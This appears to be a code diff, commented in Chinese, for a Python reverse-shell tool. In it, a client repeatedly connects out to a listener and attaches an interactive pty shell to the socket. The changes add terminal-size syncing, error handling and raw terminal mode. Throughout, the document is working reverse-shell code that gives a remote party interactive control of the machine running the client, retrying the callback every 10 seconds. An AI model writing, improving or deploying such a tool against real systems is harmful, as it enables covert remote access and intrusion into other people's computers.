@@ -18,6 +18,7 @@ import struct
 import signal
 import termios
 import argparse
+import traceback
 import threading
 import selectors
 from subprocess import Popen
@@ -29,13 +30,13 @@ STDIN = sys.stdin.fileno()
 STDOUT = sys.stdout.fileno()
 
 def get_pty_size(fd):
-    size = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b"0000") # 占位符
+    size = fcntl.ioctl(fd, termios.TIOCGWINSZ, b"0000") # 占位符
     return struct.unpack("HH", size)
 
 def set_pty_size(fd, columns, rows):
     size = struct.pack("HH", columns, rows)
     # 这个返回还知道是什么
-    return fcntl.ioctl(sys.stdin.fileno(), termios.TIOCSWINSZ, size)
+    return fcntl.ioctl(fd, termios.TIOCSWINSZ, size)
 
 
 # 窗口大小调整
@@ -46,10 +47,13 @@ def signal_SIGWINCH_handle(sigNum, frame):
     # print("sigwinch 执行完成")
 
 
-def socketshell(sock):
+def socketshell(sock, size):
     try:
         env = os.environ.copy()
         pty_master, pty_slave = pty.openpty()
+
+        # 设置对面 终端大小
+        set_pty_size(pty_slave, *size)
 
         ss = selectors.DefaultSelector()
 
@@ -92,47 +96,58 @@ def server(addr, port):
     server_addr = (addr, port)
     print(sys.argv[0], "listen: ", server_addr)
 
-    signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
+    try:
+        signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
 
-    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-    sock.bind(server_addr)
-    sock.listen(5)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
+        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+        sock.bind(server_addr)
+        sock.listen(5)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
 
-    client, addr = sock.accept()
-    print(f"有反向shell连接上: {addr}")
+        client, addr = sock.accept()
+        print(f"有反向shell连接上: {addr}")
+
+
+        size = get_pty_size(STDIN)
+        print(f"向对面发送终端大小： {size}")
+        client.send(struct.pack("!HH", *size))
     
-    # 关闭监听
-    sock.close()
+        # 关闭监听
+        sock.close()
 
-    # tty 
-    tty_bak = termios.tcgetattr(sys.stdin)
-    tty.setraw(STDIN)
+        # tty 
+        tty_bak = termios.tcgetattr(STDIN)
+        # tty.setraw(STDIN)
+        # 根这样没有关系。。。
+        tty.setraw(STDIN, termios.TCSADRAIN)
 
-    ss = selectors.DefaultSelector()
-    ss.register(client, selectors.EVENT_READ)
-    ss.register(STDIN, selectors.EVENT_READ)
+        ss = selectors.DefaultSelector()
+        ss.register(client, selectors.EVENT_READ)
+        ss.register(STDIN, selectors.EVENT_READ)
 
-    exit_flag = True
-    while exit_flag:
-        for key, event in ss.select():
-            fd = key.fileobj
-            if fd == client:
-                data = client.recv(1024)
-                if not data:
-                    exit_flag = False
-                    break
-                os.write(STDOUT, data)
-            elif fd == STDIN:
-                data = os.read(STDIN, 1024)
-                client.send(data)
+        exit_flag = True
+        while exit_flag:
+            for key, event in ss.select():
+                fd = key.fileobj
+                if fd == client:
+                    data = client.recv(1024)
+                    if data == b"":
+                        exit_flag = False
+                        break
+                    os.write(STDOUT, data)
+                elif fd == STDIN:
+                    data = os.read(STDIN, 1024)
+                    client.send(data)
 
-    client.close()
-    ss.close()
+    except Exception:
+        traceback.print_exc()
 
-    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_bak)
-    print("logout")
+    finally:
+        client.close()
+        ss.close()
+        termios.tcsetattr(STDIN, termios.TCSADRAIN, tty_bak)
+        print("logout")
 
 
 def client(addr, port=6789):
@@ -152,9 +167,25 @@ def client(addr, port=6789):
             time.sleep(10)
             continue
 
+        # 拿到初始化终端大小
+        """
+        # 感觉一次只发4个字节，tcp也应该是需要一次接收
+        size_d = b""
+        while True:
+            d = sock.recv(1)
+            if d == b"":
+                print("Peer关闭")
+                sock.close()
+
+                
+                size_d += d
+        """
+        # 感觉一次只发4个字节，tcp也应该是需要一次接收
+        size = sock.recv(4)
+        size = struct.unpack("!HH", size)
 
         print(f"client connect: {server_addr}")
-        th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
+        th = threading.Thread(target=socketshell, args=(sock, size), daemon=True)
         th.start()
         th.join()
         print(f"连接server: {server_addr}, 正常退出")
